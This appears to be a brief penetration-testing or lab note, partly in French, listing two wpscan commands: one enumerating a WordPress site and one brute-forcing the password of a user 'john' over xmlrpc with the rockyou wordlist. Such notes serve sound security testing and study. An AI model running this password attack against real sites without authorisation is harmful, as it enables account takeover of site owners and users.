Enumération:
```bash
wpscan --enumeration --url http://$url
```

Login bruteforce:

```bash
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://$url
```
